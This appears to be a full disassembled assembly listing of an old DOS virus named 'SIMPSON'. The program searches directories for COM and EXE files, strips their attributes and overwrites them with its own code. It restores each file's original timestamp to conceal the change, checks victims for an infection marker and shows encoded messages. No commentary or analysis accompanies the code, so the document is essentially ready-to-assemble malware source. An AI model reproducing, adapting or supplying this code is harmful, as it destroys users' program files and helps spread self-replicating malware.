
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€								         €€
;€€			        SIMPSON				         €€
;€€								         €€
;€€      Created:   4-Dec-92					         €€
;€€      Passes:    5	       Analysis Options on: none	         €€
;€€								         €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

data_1e		equ	2Eh
data_10e	equ	39Ah			;*
data_11e	equ	39Ch			;*
data_12e	equ	39Eh			;*
data_13e	equ	3A0h			;*
data_14e	equ	5845h			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

simpson		proc	far

start:
		push	si
		xor	si,si			; Zero register
loc_1:
		call	sub_2
		or	ax,ax			; Zero ?
		jz	loc_2			; Jump if zero
		call	sub_1
		inc	si
		inc	data_8
		jmp	short loc_3
loc_2:
		mov	dx,38Bh
		mov	ah,3Bh			; ';'
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		inc	si
loc_3:
		cmp	si,data_6
		jl	loc_1			; Jump if <
		cmp	byte ptr data_8,0
		je	loc_4			; Jump if equal
		mov	ax,2BAh
		push	ax
		call	sub_5
		pop	cx
		jmp	short loc_8
loc_4:
		cmp	byte ptr data_7,6
		jbe	loc_7			; Jump if below or =
		xor	si,si			; Zero register
		jmp	short loc_6
loc_5:
		mov	bx,si
		shl	bx,1			; Shift w/zeros fill
		push	data_2[bx]
		call	sub_5
		pop	cx
		inc	si
loc_6:
		cmp	si,3
		jl	loc_5			; Jump if <
		jmp	short loc_8
loc_7:
		mov	ax,2BAh
		push	ax
		call	sub_5
		pop	cx
loc_8:
		jmp	short $+2		; delay for I/O
		pop	si
		retn

simpson		endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_1		proc	near
		mov	dx,data_3
		add	dx,1Eh
		xor	cx,cx			; Zero register
		mov	al,1
		mov	ah,43h			; 'C'
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		mov	ax,data_3
		add	ax,1Eh
		push	ax
		call	sub_8
		pop	cx
		mov	bx,ds:data_10e
		mov	cx,data_5
		mov	dx,data_4
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		call	sub_4
		call	sub_9
		jmp	short $+2		; delay for I/O
		retn
sub_1		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_2		proc	near
		mov	ax,38Eh
		push	ax
		call	sub_6
		pop	cx
		cmp	ax,12h
		je	loc_12			; Jump if equal
		call	sub_3
		or	ax,ax			; Zero ?
		jz	loc_9			; Jump if zero
		mov	ax,1
		jmp	short loc_ret_17
		jmp	short loc_12
loc_9:
		jmp	short loc_11
loc_10:
		call	sub_3
		or	ax,ax			; Zero ?
		jz	loc_11			; Jump if zero
		mov	ax,1
		jmp	short loc_ret_17
loc_11:
		call	sub_7
		cmp	ax,12h
		jne	loc_10			; Jump if not equal
loc_12:
		mov	ax,394h
		push	ax
		call	sub_6
		pop	cx
		cmp	ax,12h
		je	loc_16			; Jump if equal
		call	sub_3
		or	ax,ax			; Zero ?
		jz	loc_13			; Jump if zero
		mov	ax,1
		jmp	short loc_ret_17
		jmp	short loc_16
loc_13:
		jmp	short loc_15
loc_14:
		call	sub_3
		or	ax,ax			; Zero ?
		jz	loc_15			; Jump if zero
		mov	ax,1
		jmp	short loc_ret_17
loc_15:
		call	sub_7
		cmp	ax,12h
		jne	loc_14			; Jump if not equal
loc_16:
		xor	ax,ax			; Zero register
		jmp	short loc_ret_17

loc_ret_17:
		retn
sub_2		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_3		proc	near
		push	si
		mov	bx,data_3
		mov	ax,[bx+18h]
		mov	ds:data_11e,ax
		mov	bx,data_3
		mov	ax,[bx+16h]
		mov	ds:data_12e,ax
		mov	ax,data_3
		add	ax,1Eh
		push	ax
		call	sub_8
		pop	cx
		mov	bx,ds:data_10e
		mov	cx,14h
		mov	dx,data_13e
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		call	sub_4
		call	sub_9
		xor	si,si			; Zero register
		jmp	short loc_20
loc_18:
		mov	al,ds:data_13e[si]
		mov	bx,data_4
		cmp	al,[bx+si]
		je	loc_19			; Jump if equal
		mov	ax,1
		jmp	short loc_21
loc_19:
		inc	si
loc_20:
		cmp	si,14h
		jl	loc_18			; Jump if <
		inc	data_7
		xor	ax,ax			; Zero register
		jmp	short loc_21
loc_21:
		pop	si
		retn
sub_3		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_4		proc	near
		mov	al,1
		mov	bx,ds:data_10e
		mov	cx,ds:data_12e
		mov	dx,ds:data_11e
		mov	ah,57h			; 'W'
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
		jmp	short $+2		; delay for I/O
		retn
sub_4		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_5		proc	near
		push	bp
		mov	bp,sp
		push	si
		mov	si,[bp+4]
		jmp	short loc_24
loc_23:
		sub	byte ptr [si],0Ah
		inc	si
loc_24:
		cmp	byte ptr [si],0
		jne	loc_23			; Jump if not equal
		mov	dx,[bp+4]
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		jmp	short $+2		; delay for I/O
		pop	si
		pop	bp
		retn
sub_5		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_6		proc	near
		push	bp
		mov	bp,sp
		mov	dx,[bp+4]
		mov	cx,0FFh
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jmp	short $+2		; delay for I/O
		pop	bp
		retn
sub_6		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_7		proc	near
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jmp	short $+2		; delay for I/O
		retn
sub_7		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_8		proc	near
		push	bp
		mov	bp,sp
		mov	dx,[bp+4]
		mov	al,2
		mov	ah,3Dh			; '='
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		mov	ds:data_10e,ax
		jmp	short $+2		; delay for I/O
		pop	bp
		retn
sub_8		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_9		proc	near
		mov	bx,ds:data_10e
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		jmp	short $+2		; delay for I/O
		retn
sub_9		endp

		pop	ss
		adc	al,5Ah			; 'Z'
		jl	$+7Bh			; Jump if <
		jno	$+7Eh			; Jump if not overflw
		db	'kw*~yy*lsq*~y*ps~*sx*wowy|'
		db	 83h, 2Eh, 00h
data_2		dw	2F1h			; Data table (indexed access)
		db	 2Ah, 03h, 63h, 03h
data_3		dw	80h
		db	 58h, 58h, 00h
data_4		dw	100h
data_5		dw	29Ah
data_6		dw	4
data_7		db	0
data_8		db	0
		db	 17h, 14h, 13h
		db	'XOa]*PVK]R++**cy'
		db	 7Fh, 7Ch, 2Ah, 7Dh, 83h
		db	'}~ow*rk}*loox*sxpom~on*'
		db	81h
		db	's~r*~ro.'
		db	 00h, 17h, 14h, 13h, 73h, 78h
		db	 6Dh, 7Fh
		db	'|klvo*nomk'
		db	 83h, 2Ah, 79h, 70h, 2Ah, 56h
		db	'OZ\Y]c*;8::6*k*'
		db	 80h, 73h, 7Ch, 7Fh, 7Dh, 2Ah
		db	 73h, 78h, 80h, 6Fh, 78h, 7Eh
		db	 6Fh, 6Eh, 2Ah, 6Ch, 83h, 2Eh
		db	 00h, 17h, 14h, 13h
		db	'ZMW<*sx*T'
		db	7Fh
		db	'xo*yp*;CC:8**Qyyn*v'
		db	 7Fh, 6Dh, 75h, 2Bh, 17h, 14h
		db	2Eh
		db	0
data_9		db	2Eh
		db	2Eh
		db	 00h, 2Ah, 2Eh, 45h
		db	 58h, 45h, 00h
		db	 2Ah, 2Eh, 43h, 4Fh, 4Dh
		db	0

seg_a		ends



		end	start
